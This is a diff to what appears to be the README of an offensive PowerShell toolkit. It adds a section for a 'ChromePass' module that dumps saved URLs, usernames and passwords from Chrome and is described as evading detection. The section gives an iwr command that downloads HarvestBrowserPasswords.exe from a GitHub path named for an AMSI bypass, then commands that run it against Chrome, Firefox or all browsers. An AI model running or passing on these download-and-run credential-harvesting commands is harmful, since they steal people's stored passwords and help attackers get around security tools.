@@ -40,3 +40,23 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-B
 .\HarvestBrowserPasswords.exe -f, --firefox
 .\HarvestBrowserPasswords.exe -c, --chrome
 ```
+
+<br />
+
+
+## Module Name
+   <b><i>ChromePass.exe</i></b>
+
+|Binary Name|Description|Privileges|Notes|
+|---|---|---|---|
+|ChromePass|dumps URLs, usernames, and passwords from chrome browser.|Administrator|ChromePass.ps1 downloads\evade detection|
+
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/HarvestBrowserPasswords.exe" -OutFile "HarvestBrowserPasswords.exe"
+```
+
+```powershell
+.\HarvestBrowserPasswords.exe -a, --all
+.\HarvestBrowserPasswords.exe -f, --firefox
+.\HarvestBrowserPasswords.exe -c, --chrome
+```
